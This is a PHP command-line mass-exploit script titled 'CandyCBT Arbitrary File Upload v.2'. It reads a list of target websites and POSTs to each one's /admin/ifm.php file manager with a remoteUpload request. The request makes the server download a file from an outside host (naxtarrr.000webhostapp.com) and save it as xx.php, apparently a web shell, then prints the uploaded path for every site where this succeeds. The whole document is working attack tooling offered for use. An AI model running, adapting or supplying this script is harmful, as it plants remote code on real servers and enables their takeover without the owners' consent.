<?php
function req($url) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "api=remoteUpload&dir=&filename=xx.php&method=curl&url=http://naxtarrr.000webhostapp.com/xx.txt");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$xx = curl_exec($ch);
	curl_close($ch);
	return $xx;
}

$green = "\033[0;32m";
$red = "\033[0;31m";
$blue = "\033[0;34m";
$white = "\033[1;37m";

system("clear");

echo $blue."
 _______                 _       _______ ______ _______ 
(_______)               | |     (_______|____  (_______)
 _       _____ ____   __| |_   _ _       ____)  )  _     Arbitrary
| |     (____ |  _ \ / _  | | | | |     |  __  (  | |    File
| |_____/ ___ | | | ( (_| | |_| | |_____| |__)  ) | |    Upload
 \______)_____|_| |_|\____|\__  |\______)______/  |_|   
                          (____/                        v.2^
                          
       {$white}Author: N4ST4R_ID | www.nyamuxpl0it.cf
 \n";

$web = $argv[1];
if(!$web) exit("{$red}[!] Usage php {$argv[0]} list.txt\n");
if(!file_exists($web)) exit("{$red}[!] File {$argv[1]} not found\n");
$get = file_get_contents($web);
$exp = explode("\n", $get);
foreach($exp as $explode) {
	$request = req($explode."/admin/ifm.php");
	//echo $request." > ".$explode."\n";
	if(preg_match("/File successfully uploaded/", $request)) {
		echo "{$green}[+] File successfully uploaded \n[+] ".$explode."/files/xx.php\n\n";
	} else {
		echo "{$red}[-] Upload successfully failed > \n[-] ".$explode."\n\n";
	}
}
?>
